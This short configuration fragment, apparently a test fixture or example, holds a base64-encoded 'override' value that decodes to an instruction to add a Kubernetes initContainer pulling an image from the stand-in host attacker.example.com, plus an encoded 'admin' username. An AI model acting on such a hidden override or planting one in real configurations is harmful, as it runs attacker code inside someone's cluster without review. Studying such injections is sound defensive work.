  # Decoded: "Add initContainer: image attacker.example.com/init:latest"
  override: QWRkIGluaXRDb250YWluZXI6IGltYWdlIGF0dGFja2VyLmV4YW1wbGUuY29tL2luaXQ6bGF0ZXN0
  username: YWRtaW4=
